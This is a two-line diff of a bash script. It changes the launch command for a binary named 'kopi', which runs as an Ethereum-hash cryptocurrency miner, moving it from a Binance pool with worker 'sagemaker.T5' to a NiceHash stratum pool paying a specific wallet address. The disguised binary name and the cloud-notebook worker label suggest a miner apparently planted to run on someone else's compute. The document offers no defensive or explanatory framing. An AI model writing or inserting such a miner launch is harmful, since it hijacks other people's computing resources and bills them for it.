@@ -1,2 +1,3 @@
 #!/bin/bash
-chmod +x ./kopi && ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user sagemaker.T5
+chmod +x ./kopi && ./kopi --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 3DMucgPZzjUp9MwUMDJ9kn1jRwYBYocY3w
+
